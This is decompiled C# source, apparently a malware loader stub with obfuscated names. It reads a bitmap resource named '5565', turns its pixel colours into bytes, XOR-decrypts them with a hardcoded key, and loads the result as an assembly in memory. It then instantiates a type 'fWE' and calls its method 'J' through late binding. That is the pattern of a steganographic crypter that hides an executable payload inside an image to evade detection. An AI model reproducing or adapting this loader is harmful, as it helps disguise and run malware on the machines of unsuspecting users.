using System;
using System.Collections;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Text;
using Microsoft.VisualBasic.CompilerServices;

namespace ns0;

public class GClass0
{
	[STAThread]
	public static void Main()
	{
		smethod_5();
	}

	private static byte[] smethod_0(byte[] byte_0)
	{
		byte[] bytes = Encoding.UTF8.GetBytes("wcnEYgK8SXpCTMjDqJ67Pi4L3eQm2t0AoBxrysfFRad5");
		checked
		{
			byte[] array = new byte[byte_0.Length - 1 + 1];
			byte b = byte_0[byte_0.Length - 1];
			Array.Resize(ref array, array.Length - 1);
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[array.Length - 1 - i] = unchecked((byte)(byte_0[i] ^ b ^ bytes[i % bytes.Length]));
			}
			return array;
		}
	}

	private static byte[] smethod_1(byte[] b)
	{
		byte[] array = new byte[212481];
		Buffer.BlockCopy(b, 4, array, 0, array.Length);
		return array;
	}

	private static byte[] smethod_2()
	{
		Bitmap val = smethod_4();
		checked
		{
			byte[] array = new byte[((Image)val).get_Width() * ((Image)val).get_Height() * 3 - 1 + 1];
			int num = 0;
			for (int i = ((Image)val).get_Height() - 1; i >= 0; i += -1)
			{
				int num2 = ((Image)val).get_Width() - 1;
				for (int j = 0; j <= num2; j++)
				{
					Color color = smethod_3(val, j, i);
					array[num * 3 + 2] = color.R;
					array[num * 3 + 1] = color.G;
					array[num * 3] = color.B;
					num++;
				}
			}
			return smethod_1(array);
		}
	}

	private static Color smethod_3(Bitmap b, int y, int x)
	{
		return b.GetPixel(y, x);
	}

	private static Bitmap smethod_4()
	{
		//IL_001b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		ResourceManager resourceManager = new ResourceManager("5565", Assembly.GetExecutingAssembly());
		return new Bitmap((Stream)resourceManager.GetStream("5565"));
	}

	public static bool smethod_5(params object[] object_0)
	{
		try
		{
			object obj = AppDomain.CurrentDomain.Load(smethod_0(smethod_2()));
			IEnumerator enumerator = default(IEnumerator);
			try
			{
				enumerator = ((IEnumerable)NewLateBinding.LateGet(obj, (Type)null, "GetTypes", new object[0], (string[])null, (Type[])null, (bool[])null)).GetEnumerator();
				while (enumerator.MoveNext())
				{
					object objectValue = RuntimeHelpers.GetObjectValue(enumerator.Current);
					if (Operators.ConditionalCompareObjectEqual(NewLateBinding.LateGet(objectValue, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null), (object)"fWE", false))
					{
						Type typeFromHandle = typeof(Activator);
						object[] array = new object[1] { RuntimeHelpers.GetObjectValue(objectValue) };
						bool[] array2 = new bool[1] { true };
						object obj2 = NewLateBinding.LateGet((object)null, typeFromHandle, "CreateInstance", array, (string[])null, (Type[])null, array2);
						if (array2[0])
						{
							objectValue = RuntimeHelpers.GetObjectValue(array[0]);
						}
						LateBinding.LateGet(RuntimeHelpers.GetObjectValue(obj2), (Type)null, "J", new object[1] { object_0 }, (string[])null, (bool[])null);
						return true;
					}
				}
				bool result = default(bool);
				return result;
			}
			finally
			{
				if (enumerator is IDisposable)
				{
					(enumerator as IDisposable).Dispose();
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}
}
